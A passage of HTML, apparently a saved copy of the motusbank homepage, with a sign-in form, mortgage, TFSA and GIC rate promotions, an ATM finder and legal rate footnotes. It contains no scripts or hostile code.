h-2.5V69.2z M313.3,77.3c9.6,0,17.6-7.6,18-17.2v-0.7c0-9.9-8.1-17.9-18-17.9s-17.9,8.1-17.9,18C295.5,69.3,303.4,77.3,313.3,77.3
L313.3,77.3z"></path>
      <path class="st0" d="M346.3,40.6h2.5v8.7c2.2-7,8.6-9.5,14.5-9.5c9.1,0,16,6.4,16,17v23.1h-2.5V56.7c0-9-5.9-14.5-13.5-14.4
c-7.4,0-14.1,4.1-14.5,15.1v22.4h-2.5L346.3,40.6z"></path>
      
      <path class="st1" d="M53.1,6.1c22.6,0,42.2,11.9,52.4,29.5C93.1,6.7,59.4-6.7,30.5,5.8c-13.4,5.8-24,16.4-29.8,29.8
C10.9,18.1,30.5,6.1,53.1,6.1z"></path>
      
      <path class="st2" d="M53.1,112.7c-22.6,0-42.2-11.9-52.4-29.5c12.5,29,46.1,42.3,75.1,29.8c13.4-5.8,24-16.4,29.8-29.8
C95.4,100.8,75.7,112.7,53.1,112.7z"></path>
      <path class="st0" d="M416.2,79.8L394,58.5v21.3h-2.5V25.6h2.5v31.7l16.2-16.7h3.6L397,57.9l23,22H416.2z">
      </path>
      <path class="st0" d="M422.7,25.6v0.5h-1.2v3.3H421V26h-1.2v-0.5L422.7,25.6z"></path>
      <path class="st0" d="M426.8,25.6h0.5l0.5,3.9h-0.5l-0.4-2.9l-1.2,2.5h-0.5l-1.2-2.5l-0.3,2.9h-0.5l0.5-3.9h0.5l1.4,2.9L426.8,25.6z">
      </path>
    </symbol>
    <symbol id="MotusBank_Spiral_6_RGB" viewBox="0 0 230.42 243.02">
      
      <g data-name="—ÎÓÈ_1" fill-rule="evenodd">
        <path d="M251.13 381.64a97.35 97.35 0 1 1-110.23 82.47 97.36 97.36 0 0 1 110.24-82.46zm1.65 7.71A86.24 86.24 0 1 0 325.84 487a86.26 86.26 0 0 0-73.05-97.64z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" opacity=".75" fill="url(#motus-circle-1-a)"></path>
        <path d="M320 415.69a86.2 86.2 0 1 1-117.37-32.93A86.21 86.21 0 0 1 320 415.69zm-4.78 5.46a80.93 80.93 0 1 0-30.91 110.2 80.94 80.94 0 0 0 30.87-110.2z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-b)"></path>
        <path d="M149.19 408.18a115.18 115.18 0 1 1 44.51 156.69 115.2 115.2 0 0 1-44.51-156.69zm9.56 1.62a108.14 108.14 0 1 0 147.1-41.8 108.15 108.15 0 0 0-147.1 41.8z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-c)"></path>
        <path d="M290.13 382.94a109.61 109.61 0 1 1-145.45 53.58 109.62 109.62 0 0 1 145.45-53.58zm.53 2.94a105.94 105.94 0 1 0 51.79 140.58 106 106 0 0 0-51.79-140.58z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-d)"></path>
        <path d="M309.86 558.09a101.16 101.16 0 1 1 34.6-138.81 101.17 101.17 0 0 1-34.6 138.81zm-2.52-1.09a97.77 97.77 0 1 0-134.16-33.44A97.78 97.78 0 0 0 307.34 557z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-e)"></path>
        <path d="M246.11 570.84a93.48 93.48 0 1 1 105.26-80 93.5 93.5 0 0 1-105.26 80zm3.28-9.22a82.82 82.82 0 1 0-70.87-93.26 82.83 82.83 0 0 0 70.88 93.26z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-f)"></path>
        <path d="M269 392.77a73.7 73.7 0 1 1-83.46 62.43A73.71 73.71 0 0 1 269 392.77zm1.25 5.84a65.29 65.29 0 1 0 55.31 73.94 65.3 65.3 0 0 0-55.28-73.94z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" fill="url(#motus-circle-1-g)"></path>
        <path d="M297.5 531.3a72.43 72.43 0 1 1 18.32-100.78A72.44 72.44 0 0 1 297.5 531.3zm-4.94-3.57a68 68 0 1 0-94.61-17.2 68 68 0 0 0 94.6 17.2z" transform="translate(-134.57 -349.07)" style="mix-blend-mode:multiply" opacity=".15" fill="url(#motus-circle-1-h)"></path>
      </g>
    </symbol>
    <symbol id="twitter-share-icon" viewBox="0 0 128 128">
      <path d="M64 2.1C29.9 2.1 2.1 29.9 2.1 64c0 34.1 27.7 61.8 61.8 61.8 34.1 0 61.8-27.7 61.8-61.8C125.8 29.9 98 2.1 64 2.1zm0 116.7C33.7 118.8 9.1 94.2 9.1 64S33.7 9.1 64 9.1s54.8 24.6 54.8 54.8-24.6 54.9-54.8 54.9z">
      </path>
      <path d="M96.2 37.2c-2.7 1.6-5.7 2.8-8.9 3.4-2.6-2.7-6.2-4.4-10.2-4.4-9.1 0-15.7 8.4-13.7 17.2-11.7-.6-22-6.2-28.9-14.7-3.7 6.3-1.9 14.5 4.3 18.7-2.3-.1-4.5-.7-6.3-1.8-.2 6.5 4.5 12.6 11.2 13.9-2 .5-4.1.7-6.3.2 1.8 5.6 7 9.6 13.1 9.7-5.9 4.6-13.3 6.7-20.8 5.8 6.2 4 13.6 6.3 21.5 6.3 26 0 40.7-22 39.9-41.7 2.7-2 5.1-4.4 7-7.3-2.5 1.1-5.2 1.9-8.1 2.2 3-1.5 5.2-4.2 6.2-7.5z">
      </path>
    </symbol>
    <symbol id="twitter" viewBox="0 0 25 25">
      <path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 -0.000976562C5.59644 -0.000976562 0 5.59547 0 12.499C0 19.4026 5.59644 24.999 12.5 24.999C19.4036 24.999 25 19.4026 25 12.499C25 5.59547 19.4036 -0.000976562 12.5 -0.000976562ZM12.1519 10.5917L12.1256 10.1592C12.0469 9.03814 12.7377 8.01419 13.8306 7.61697C14.2328 7.47574 14.9148 7.45808 15.3607 7.58167C15.5356 7.63463 15.8678 7.81117 16.1039 7.97005L16.5323 8.26135L17.0045 8.11129C17.2668 8.03185 17.6165 7.89944 17.7739 7.81117C17.9226 7.73173 18.0537 7.68759 18.0537 7.71407C18.0537 7.86414 17.7302 8.37611 17.4592 8.65857C17.0919 9.05579 17.1969 9.0911 17.94 8.82629C18.386 8.67622 18.3947 8.67622 18.3073 8.84394C18.2548 8.93221 17.9838 9.24116 17.6952 9.52363C17.2056 10.0091 17.1794 10.0621 17.1794 10.4681C17.1794 11.0949 16.8821 12.4013 16.5848 13.1163C16.034 14.458 14.8536 15.8438 13.6732 16.5412C12.012 17.521 9.79986 17.7681 7.93749 17.1944C7.31671 17.0002 6.25 16.5059 6.25 16.4176C6.25 16.3911 6.57351 16.3558 6.96697 16.347C7.78885 16.3293 8.61074 16.0998 9.31022 15.6938L9.78237 15.4113L9.24027 15.2259C8.47085 14.9611 7.78011 14.3521 7.60524 13.7783C7.55278 13.5929 7.57027 13.5841 8.0599 13.5841L8.56703 13.5753L8.13859 13.3722C7.63147 13.1163 7.16807 12.6837 6.94074 12.2424C6.77461 11.9246 6.56477 11.1213 6.62597 11.0595C6.64346 11.0331 6.82707 11.086 7.03691 11.1566C7.64021 11.3773 7.71891 11.3244 7.36917 10.9536C6.71341 10.2828 6.5123 9.28529 6.82707 8.3408L6.97571 7.91709L7.55278 8.49086C8.73315 9.64721 10.1234 10.3357 11.7147 10.5387L12.1519 10.5917Z">
      </path>
    </symbol>
  <linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="20.4589" y1="72.6431" x2="118.8489" y2="86.1531" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
        <stop offset="0" style="stop-color:#FFC600"></stop>
        <stop offset="0.2" style="stop-color:#FF9B00"></stop>
        <stop offset="0.37" style="stop-color:#E9371D"></stop>
        <stop offset="0.59" style="stop-color:#A52BB4"></stop>
        <stop offset="0.79" style="stop-color:#4A2BB4"></stop>
        <stop offset="0.99" style="stop-color:#00D1AF"></stop>
      </linearGradient><linearGradient id="SVGID_2_" gradientUnits="userSpaceOnUse" x1="121.5109" y1="9.0065" x2="31.0909" y2="-0.6835" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
        <stop offset="0" style="stop-color:#FFC600"></stop>
        <stop offset="0.2" style="stop-color:#FF9B00"></stop>
        <stop offset="0.37" style="stop-color:#E9371D"></stop>
        <stop offset="0.59" style="stop-color:#A52BB4"></stop>
        <stop offset="0.79" style="stop-color:#4A2BB4"></stop>
        <stop offset="0.99" style="stop-color:#00D1AF"></stop>
      </linearGradient><linearGradient id="SVGID1" gradientUnits="userSpaceOnUse" x1="20.4589" y1="72.6431" x2="118.8489" y2="86.1531" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
        <stop offset="0" style="stop-color:#FFC600"></stop>
        <stop offset="0.2" style="stop-color:#FF9B00"></stop>
        <stop offset="0.37" style="stop-color:#E9371D"></stop>
        <stop offset="0.59" style="stop-color:#A52BB4"></stop>
        <stop offset="0.79" style="stop-color:#4A2BB4"></stop>
        <stop offset="0.99" style="stop-color:#00D1AF"></stop>
      </linearGradient><linearGradient id="SVGID2" gradientUnits="userSpaceOnUse" x1="121.5109" y1="9.0065" x2="31.0909" y2="-0.6835" gradientTransform="matrix(1 0 0 -1 -19.72 101.56)">
        <stop offset="0" style="stop-color:#FFC600"></stop>
        <stop offset="0.2" style="stop-color:#FF9B00"></stop>
        <stop offset="0.37" style="stop-color:#E9371D"></stop>
        <stop offset="0.59" style="stop-color:#A52BB4"></stop>
        <stop offset="0.79" style="stop-color:#4A2BB4"></stop>
        <stop offset="0.99" style="stop-color:#00D1AF"></stop>
      </linearGradient></svg>
  <!-- endinject -->
</div>

<a href="#content" class="skip-to-content">Skip to Content</a>
<div class="grid-container mobile-header hide-for-xlarge text-center" id="mobile-header">
  <a href="https://www.motusbank.ca/Home" class="logo">
    <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
      <use xlink:href="#motusbank-logo" href="#motusbank-logo"></use>
    </svg>
  </a>
  
  <div class="Search-mobile">
    <div id="p_lt_ctl00_SmartSearchBox_pnlSearch" class="searchBox" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'p_lt_ctl00_SmartSearchBox_btnImageButton')">
	
    <label for="p_lt_ctl00_SmartSearchBox_txtWord" id="p_lt_ctl00_SmartSearchBox_lblSearch" style="display:none;">Search for:</label>
    <input type="hidden" name="p$lt$ctl00$SmartSearchBox$txtWord_exWatermark_ClientState" id="p_lt_ctl00_SmartSearchBox_txtWord_exWatermark_ClientState"><input name="p$lt$ctl00$SmartSearchBox$txtWord" type="text" maxlength="1000" id="p_lt_ctl00_SmartSearchBox_txtWord" class="searchInput accent-border light-gray-background carbon-text form-control" value="Search">
    
    <input type="image" name="p$lt$ctl00$SmartSearchBox$btnImageButton" id="p_lt_ctl00_SmartSearchBox_btnImageButton" src="files/basic1-015_search_zoom_find.png" alt="Search">
    <div id="p_lt_ctl00_SmartSearchBox_pnlPredictiveResultsHolder" class="predictiveSearchHolder">

	</div>

</div>

  </div>
</div>
<div class="branch-closure active">
  
  
  
  
</div>

<header class="global-header white-background" style="box-shadow: 0 0 0.25rem rgba(0, 0, 0, 0.2);" data-gtm-type="section" data-gtm-label="header">
  <div class="full-bleed-container header-correct">
    <div class="primary navigation grid-container" data-module="header" style="box-shadow:none;" data-gtm-type="section" data-gtm-label="primary-navigation">
      <a href="https://www.motusbank.ca/Home" class="logo show-for-xlarge hide-logo-for-tablet">
        <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
          <use xlink:href="#motusbank-logo" href="#motusbank-logo"></use>
        </svg>
        <img src="files/small_motus-logo.svg" class="logo-tablet" alt="full bleed demo">
      </a>
      <nav class="nav-font">
        <ul>
          <!--<li data-module-role="flyout"><a href="#flyout">Accounts</a><div class="tertiary accent-background"><div class="subnav"><a href="~/Accounts/Savings">Savings</a><a href="~/Accounts/Chequing">Chequing</a><a href="~/Accounts/Investing">Investing</a><a href="~/Accounts/Mortgages">Mortgages</a><a href="~/Accounts/Borrowing">Borrowing</a></div></div></li><li data-module-role="flyout"><a href="#flyout">Community</a><div class="tertiary accent-background"><div class="subnav"><a href="~/Community/good-to-know">Good to know</a></div></div></li><li data-module-role="flyout"><a href="#flyout">Ways to bank</a><div class="tertiary accent-background"><div class="subnav"><a href="~/Ways-to-bank/Money-Mover">Money Mover</a></div></div></li>-->
          <li data-module-role="flyout">
            <a href="#flyout">Accounts</a>
            <div class="tertiary accent-background">
              <div class="subnav">
                <a href="https://www.motusbank.ca/Accounts/Savings">Savings</a>
                <a href="https://www.motusbank.ca/Accounts/Chequing">Chequing</a>
                <a href="https://www.motusbank.ca/Accounts/Investing">Investing</a>
                <a href="https://www.motusbank.ca/Accounts/Mortgages">Mortgages</a>
                <a href="https://www.motusbank.ca/Accounts/Borrowing">Borrowing</a>
              </div>
            </div>
          </li>
          
          <li>
            <a href="https://www.motusbank.ca/Ways-to-Bank">Ways to bank</a>
          </li>
          
          <li class="hide-for-small show-for-xlarge">
            <a href="https://www.motusbank.ca/Community">Good to know</a>
          </li>
          
          <li class="search-form show-for-xlarge">
            <div class="form-div motus-bank-search">
              <div id="p_lt_ctl03_MotusSmartSearchBox_pnlSearch" class="searchBox" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'p_lt_ctl03_MotusSmartSearchBox_btnImageButton')">
	         
        
  
  <label for="p_lt_ctl03_MotusSmartSearchBox_txtWord" id="p_lt_ctl03_MotusSmartSearchBox_lblSearch">Search for:</label>
    <input name="p$lt$ctl03$MotusSmartSearchBox$txtWord" type="text" maxlength="1000" id="p_lt_ctl03_MotusSmartSearchBox_txtWord" class="searchInput accent-border light-gray-background carbon-text form-control" placeholder="Search">
    
    <input type="image" name="p$lt$ctl03$MotusSmartSearchBox$btnImageButton" id="p_lt_ctl03_MotusSmartSearchBox_btnImageButton" class="btnSearch" src="files/basic1-015_search_zoom_find.png" alt="Search">
    <div id="p_lt_ctl03_MotusSmartSearchBox_pnlPredictiveResultsHolder" class="predictiveSearchHolder">

	</div>
 

</div>

              <!--<label for="header-search">Search</label>
<input type="text" id="header-search" name="search-query" maxlength="100" placeholder="Search" />
<button type="submit">Submit</button>-->
            </div>
          </li>
          
          
          
          <li class="show-for-small">
            <a class="accent-background join-now" href="https://www.motusbank.ca/Join-Now">Join now</a>
          </li>
          
          
          <li data-module-role="" class="signIn-open js-open" id="signIn">
            <a id="TextSingIn" href="javascript:void(0)" class="white-text">Sign in</a>
            <div class="tertiary signin" id="signindiv">
              

  <p>Account sign in</p>
  <div class="form-div">
    <label for="userId">Email or member #</label>
    <input type="text" placeholder="Email or member #" name="UN" id="userId" maxlength="50" required >
    <label for="chkRemeberMe" class="container show-label">
      Remember me<input id="chkRemeberMe" name="chkRemeberMe" value="remember" type="checkbox">
      <span class="checkmark"></span>
    </label>
    <label for="TxtPwd">Password</label>
    <input type="password" placeholder="Password" name="PW" id="pwd" autocomplete="off" maxlength="50" required >    
    <input type="hidden" id="gToken" name="token" value="03AOLTBLTrsHOoP2t36MC5Meau-hifxHB2PRuQKB29juP9qr482s-XETqMNUMGgSKIHOmFWmCJGtlsePeD_jrBpCy9lL0gR5XCzNFQ4hd6qBJtdznaDVCl0y7peWQGfeeGMY_veKWmeSe8buOAyLKehKiKShmtkkFHHsBSSgc7wzV1KpG1zjQlXcApTRVoax3QlEI1yoScQ_zOL636zZ-PFMQvQ8wvFeON7BS86KLAyK4bsgYZwZsccbkAxmu-2TQxD1TVMxdAMVbbxxuxhpnmR78LhYQ6RVt6XZ3Gk7yJdVrA0HXtQZSAkV4OIriZ8Aj6wRBoHwb6_HIR">
    
      <a id="forgot-pword" href="https://banking.motusbank.ca/ForgotPassword_Setup">I forgot my password <i class="fas fa-arrow-right"></i>
      </a>
    
    
      <button id="htmlbtnSignIn" value="Sign In1" class="button white-background carbon-text signin-submit" type="submit">Sign In </button>
    
<!--    <a id="securityprivacy" href= "/Legal-Stuff/Privacy-Security#security-gurantee"> 100% Security Guarantee <i class="fas fa-arrow-right"></i>
    </a>-->
    	<p>
		This site is protected by reCAPTCHA and the Google <a style="display:inline" href="https://policies.google.com/privacy">Privacy Policy</a> and <a style="display:inline" href="https://policies.google.com/terms">Terms of Service</a> apply.
	</p>    
  </div>

            </div>
          <button id="SingInBtnClosee" style="display: none;"><img src="files/Close-sign-in-button.png"></button><div id="styleBtnCLose"><style>#SingInBtnClosee { position: absolute;right: 0.5rem;top: 0.5rem;z-index: 9999;background: white;line-height: 1.215;border-radius: 50%;}</style></div></li>
          
          
          
          
          
          
          
          
        </ul>
      </nav>
    </div>
  </div>
  <div class="branch-closure active">
    
    
    
    
  </div>
</header>


<main id="content" tabindex="0" data-gtm-type="section" data-gtm-label="main-content">
  
<div class="full-bleed-container hero-banner hero-banner-margin-bottom container-webpart">
  <div class="motus-bank-container">
    <div class="grid-x white-background panel bg-hero-content margin-right-none-hero-banner" id="hero-title-tablet">
      <div class="hide-for-xlarge background-image small-centered medium-uncentered medium-6 large-5 columns hide-for-tablet" style="background-image: url('https://www.motusbank.ca//MotusBank/media/motusbank/home/homepage-976816122-mobile.jpg?ext=.jpg');"></div>
      <div class="show-for-xlarge background-image small-centered medium-uncentered medium-6 large-5 columns show-for-tablet" style="background-image: url('https://www.motusbank.ca//MotusBank/media/motusbank/home/homepage-976816122.jpg?ext=.jpg');background-position: right;background-size: 60%"></div>
      <div class="hero xlarge-6 zone-hero-banner-title left-label-mobile promo-mobile width-100 padding-bottom-for-phone">
        <div class="row intro left-label-mobile herro-banner-title">
          
            <div class="small-centered medium-uncentered medium-6 large-7 columns cell medium-text-left motus-bank-row-title-banner text-hero-banner-top-bg-bottom">
            <h1 class="carbon-text size-60">2.49%* on a <br> 2-year <br> mortgage!</h1>
            <p class="p-header">You could buy your dream home<br>
before summer ends.&nbsp;</p>
            <a class="button accent-background btn-watch-video show-for-xlarge" href="https://www.motusbank.ca/Accounts/Mortgages?ip_name=2FRM-Summer&amp;ip_pos=home-hero&amp;ip_cr=learn-more" data-gtm-vis-recent-on-screen-11195435_36="533" data-gtm-vis-first-on-screen-11195435_36="533" data-gtm-vis-total-visible-time-11195435_36="2000" data-gtm-vis-has-fired-11195435_36="1">Learn more</a>
              <a class="button accent-background btn-watch-video hide-for-xlarge" href="https://www.motusbank.ca/Accounts/Mortgages?ip_name=2FRM-Summer&amp;ip_pos=home-hero&amp;ip_cr=learn-more">Learn more</a>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



<div class="modal" id="hero-banner-video-modal-1" data-module="modal">
  <div class="modal-window">
    <video preload="metadata" data-gtm-type="video" data-gtm-label="Learn more" class="desktop-video  show-for-xlarge" allowfullscreen="allowfullscreen" controls="controls">
      <source src="" type="video/mp4">
    </video>
    <a href="#close" class="close" data-module-role="close">Close</a>
  </div>
</div>
<div class="modal" id="hero-banner-video-modal-2" data-module="modal">
    <div class="modal-window">
      <video preload="metadata" data-gtm-type="video" data-gtm-label="Learn more" class="mobile-video hide-for-xlarge" allowfullscreen="allowfullscreen" controls="controls">
        <source src="" type="video/mp4">
      </video>
      <a href="#close" class="close" data-module-role="close">Close</a>
    </div>
  </div>




<!-- THIS IS THE START OF THE GRID CONTAINER WEBPART -->

<div class="full-bleed-container very-light-gray-background" id="rates-content">
    <div class="motus-bank-container">
        <div class="grid-x grid-margin-x">
            <div class="small-12 cell motus-bank-row">
                <!-- THIS IS THE START OF THE GRID CONTAINER WEBPART -->


                <div class="grid-x promo no-bg no-margin">
                    <div class="small-12 cell promo-content">
                        <h3>Rates that’ll move you</h3>
                        <div class="grid-container full">
                            <div class="grid-x rate-carousel no-carousel mint-arrow">
                                <div class="small-12 large-4 cell rate text-left Rates-Mortgages">
                                    <div class="grid-x">
                                        <div class="small-12 cell">
                                            <h4 class="heading">5-year fixed mortgage</h4>
                                            <p class="rates-su-title">Move in faster - get a great, dependable rate with a smaller down payment.</p>

                                        </div>
                                        <div class="small-12 cell">
                                            <span>High ratio interest rate</span>
                                            <h2>2.82%<sup class="supscripted">1<sup></sup></sup></h2>
                                        </div>
                                        <div class="small-12 cell">
                                            <a class="button carbon-text" data-gtm-type="product" data-gtm-label="598516603" href="https://lending.motusbank.ca/SelectProduct?productId=598516603&amp;ip_name=5FRMHR-Apply&amp;ip_pos=home-rates&amp;ip_cr=apply">Apply now</a>
                                            <a class="button carbon-background" href="https://www.motusbank.ca/Accounts/Mortgages?ip_name=5FRMHR-Learn&amp;ip_pos=home-rates&amp;ip_cr=learn-more">Learn more</a>
                                        </div>
                                    </div>
                                </div>


                                <div class="small-12 large-4 cell rate text-left Rates-Savings">
                                    <div class="grid-x">
                                        <div class="small-12 cell">
                                            <h4 class="heading">TFSA savings account</h4>
                                            <p class="rates-su-title">Put something away for a rainy day, while earning tax-free interest on every dollar.</p>

                                        </div>
                                        <div class="small-12 cell">
                                            <span>Start earning</span>
                                            <h2>2.50%<sup class="supscripted">2<sup></sup></sup></h2>
                                        </div>
                                        <div class="small-12 cell">
                                            <a class="button carbon-text" data-gtm-type="product" data-gtm-label="861569170" href="https://join.motusbank.ca/SelectProduct?productIds=861569170&amp;sweep=false&amp;ip_name=TFSA-Open&amp;ip_pos=home-rates&amp;ip_cr=open">Open an account</a>
                                            <a class="button carbon-background" href="https://www.motusbank.ca/Accounts/Savings?ip_name=TFSA-Learn&amp;ip_pos=home-rates&amp;ip_cr=learn-more">Learn more</a>
                                        </div>
                                    </div>
                                </div>


                                <div class="small-12 large-4 cell rate text-left Rates-Everyday">
                                    <div class="grid-x">
                                        <div class="small-12 cell">
                                            <h4 class="heading">18-month RRSP GIC</h4>
                                            <p class="rates-su-title">Invest in your future, and enjoy a great rate on an 18-month RRSP GIC.</p>

                                        </div>
                                        <div class="small-12 cell">
                                            <span>Start earning</span>
                                            <h2>2.85%<sup class="supscripted">3<sup></sup></sup></h2>
                                        </div>
                                        <div class="small-12 cell">
                                            <a class="button carbon-text" data-gtm-type="product" data-gtm-label="148772769%3b764726971" href="https://join.motusbank.ca/SelectProduct?productIds=148772769%3b764726971&amp;sweep=False&amp;ip_name=GIC-18-RRSP&amp;ip_pos=home-rates&amp;ip_cr=open">Open a GIC</a>
                                            <a class="button carbon-background" href="https://www.motusbank.ca/Accounts/Investing?ip_name=GIC-Learn&amp;ip_pos=home-rates&amp;ip_cr=learn-more">Learn more</a>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                 
                    <div class="small-12 cell all-rates">
                        <span><strong>All the rates you can literally bank on.</strong></span> <a class="button carbon-background white-text" href="https://www.motusbank.ca/Support/Rates?ip_name=Rates&amp;ip_pos=home-rates&amp;ip_cr=view-all">View all rates</a>
                    </div>
                </div>


                <!-- THIS IS THE END OF THE GRID CONTAINER WEBPART -->
            </div>
        </div>
    </div>
</div>
<!-- THIS IS THE END OF THE GRID CONTAINER WEBPART -->









<div class="full-bleed-container uncontained accent-background container-webpart" id="section-tow">
  <div class="motus-bank-container" id="th-motusbank-mortgage-content">
    <div class="motus-bank-row">
      <div class="grid-x promo with-label promo-mobile padding-bottom-and-margin-bottom-for-tablet">
        <div class="section-label left-label-mobile">
          <span class="carbon-border carbon-text">The motusbank mortgage</span>
        </div>
        <div class="show-for-medium medium-5 bleed-image-container hide-for-tablet">
          <img src="files/happy-woman-899501708.png" class="right bottom" alt="full bleed demo">
        </div>
        <div class="hide-for-xlarge hide-for-medium background-image bg-bottom bg-left bg-size-contain show-for-tablet-bg" id="bg-mobile" style="background-image: url('/MotusBank/media/motusbank/home/happy-woman-mobile-899501708.png?ext=.png');"></div>
        <!-- <div class="show-for-xlarge background-image bg-left bg-bottom bg-size-auto" style="background-image: url('assets/img/interac-promo-bg.png');"></div> -->
        <div class="small-12 medium-7 cell promo-content espace-text mortgage-section-home width-100">
          <h3>There’s more than one way to buy a home. An amazing rate is a good place to start.</h3>
          <p>Everyone deserves a shot at homeownership. The rate is 
important, for sure, so let’s start there. At motusbank we’ll always 
offer you a great, competitive mortgage rate. No awkward sales 
shenanigans. No funny business. Just an awesome rate, period.</p>

<p>From there, we’ll work with you to make it happen, whether you’re a 
solo act, a couple, or a couple of couples. The Friends and Family 
mortgage is just one of the ways we’re innovating. You can pretty much 
book the moving van.</p>

          <a class="button white-background carbon-text" href="https://www.motusbank.ca/Accounts/Mortgages?ip_name=Mortgage&amp;ip_pos=home-banner&amp;ip_cr=learn-more">More about mortgages</a>
          <p></p>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="full-bleed-container container-webpart" id="bg-good-to-know" style="background-color:#e6e7e9">
      <div class="motus-bank-container">
          <div class="motus-bank-row">
              <div class="grid-x promo with-label">
                  <div class="section-label left-label-mobile">
                      <span class="carbon-border carbon-text">Good to know</span>
                  </div>
                  <div class="hide-for-xlarge background-image bg-right bg-center-y bg-size-auto-with-height bg-mobile-good-to-know" style="background-image: url('https://www.motusbank.ca/Motusbank/media/motusbank/home/Home_GoodtoKnow.png?ext=.png');"></div>
                  <div class="show-for-xlarge background-image bg-right bg-center-y bg-size-cover" id="GTNRight" style="background-image: url('https://www.motusbank.ca/Motusbank/media/motusbank/home/Home_GoodtoKnow_D.png?ext=.png');background-position-x: right;    background-size: contain;">
                  </div>
                  <div class="small-12 xlarge-6 xxlarge-8 cell padding-bottom-good-to-know">
                      <h4 class="heading carbon-text">How to choose the right investment for you</h4>
                      <a class="button carbon-background white-text" style="color:#414042" href="https://www.motusbank.ca/Community/Good-to-know/Invest/April-2019/How-to-choose-the-right-investment-for-you?ip_name=Blog&amp;ip_pos=home-banner&amp;ip_cr=read">Read the article</a>
                  </div>
              </div>
          </div>
      </div>
  </div>








<!-- Starts Find an ATM -->
<div class="page-footer container-webpart">
  <div class="full-bleed-container" style="background-color:#fafafa">
    <div class="full-bleed-container carbon-background find-atm-module">
      <div class="motus-bank-container">
        <div class="motus-bank-row">
          <div class="grid-x">
            <div class="small-12 text-center medium-text-left cell medium-2">
              <h4 class="white-text find-an-atm">Find an ATM</h4>
            </div>
            <div class="hide-for-small-only medium-1">
              <div class="vertical_dotted_line"></div>
            </div>
            <div class="small-12 cell medium-9  text-center medium-text-center">
              <div class="grid-x find-atm-btn-location">
                <div class="small-12 medium-3  cell">
                  <a class="button locate white-background carbon-text button-use-my-location" title="Use my current location" href="https://www.motusbank.ca/find-an-atm.aspx?search=here">Use my location</a>
                </div>
                <div class="small-12 medium-1 cell text-center">
                  <span class="find-atm-or">or</span>
                </div>
                <div class="small-12 medium-8 large-8 cell">
                  <div class="grid-x grid-margin-x">
                    <div class="small-12 medium-8 cell">
                      <label>
                        <input id="locBtn" class="searchInput accent-border light-gray-background carbon-text" type="text" name="search" placeholder="City or postal code" autocomplete="off">
                      </label>
                    </div>
                    <div class="small-12 medium-4 xlarge-4 cell medium-text-center xlarge-text-center">
                      <a class="button accent-background search click-search" href="https://www.motusbank.ca/find-an-atm.aspx?search=" title="Find an ATM">Find an ATM</a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Ends Find an ATM -->

<div class="full-bleed-container legal container-webpart" id="sep_legal">
    <div class="motus-bank-container">
      <div class="motus-bank-row">
        <div class="small-12 cell">
          <ul class="accordion grid-x grid-padding-x carbon-text" data-accordion="data-accordion" data-allow-all-closed="true" role="tablist">
            <li class="accordion-item" data-accordion-item="data-accordion-item">
              <a aria-controls="h44tsq-accordion" aria-expanded="false" aria-selected="false" class="accordion-title no-bg carbon-text" href="#" id="h44tsq-accordion-label" role="tab">Legal</a>
              <div aria-hidden="true" aria-labelledby="h44tsq-accordion-label" class="accordion-content small-12 cell" data-tab-content="data-tab-content" id="h44tsq-accordion" role="tabpanel" style="display: none;"><p>*APR 2.55%<br>
<br>
<sup>1</sup>APR 2.84%<br>
<br>
<sup>2</sup>Interest is calculated on the closing daily balance and is 
paid monthly. Rates are provided for information purposes only and are 
subject to change at any time.<br>
<br>
<sup>3</sup>Interest is calculated and accrued daily. To calculate the 
daily interest, we divide the annual interest by 365. We multiply that 
figure by the GIC book value to determine how much interest to accrue. 
Interest is paid on maturity for GICs that do not pay interest during 
their term.<br>
<br>
The Annual Percentage Rate (APR) is based on a $300,000 mortgage, 25 
year amortization, for the applicable term and the fee to obtain a 
property appraisal of $325 (fees vary from $0 to $455). If there are no 
fees, the APR and interest rate will be the same. APR is rounded to two 
decimal places.<br>
<br>
A High Ratio mortgage applies when you have a down payment of less than 20% to put toward the purchase of a home.&nbsp;</p>

              </div>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </div>



 
  
</main>

<footer data-gtm-type="section" data-gtm-label="footer" class="page-footer">
  <div class="full-bleed-container" style="background-color:#fafafa" id="hide_footer">
    <div class="full-bleed-container carbon-background find-atm-module">
      <div class="motus-bank-container">
        <div class="motus-bank-row">
          <div class="grid-x">
            
            <div class="small-12 text-center medium-text-left cell medium-2">
              <h4 class="white-text find-an-atm">Find an ATM</h4>
            </div>
            <div class="hide-for-small-only medium-1">
              <div class="vertical_dotted_line"></div>
            </div>
            <div class="small-12 cell medium-9  text-center medium-text-center">
              <div class="grid-x find-atm-btn-location">
                <div class="small-12 medium-3 cell">
                  <a class="button locate white-background carbon-text button-use-my-location" title="Use my current location" href="https://www.motusbank.ca/find-an-atm.aspx?search=here">Use my location</a>
                </div>
                <div class="small-12 medium-1 cell text-center">
                  <span class="find-atm-or">or</span>
                </div>
                <div class="small-12 medium-8 large-8 cell">
                  <div class="grid-x grid-margin-x">
                    <div class="small-12 medium-8 cell">
                      <label>
                        <input id="locBtn" class="searchInput accent-border light-gray-background carbon-text" type="text" name="search" placeholder="City or postal code" autocomplete="off">
                      </label>
                    </div>
                    
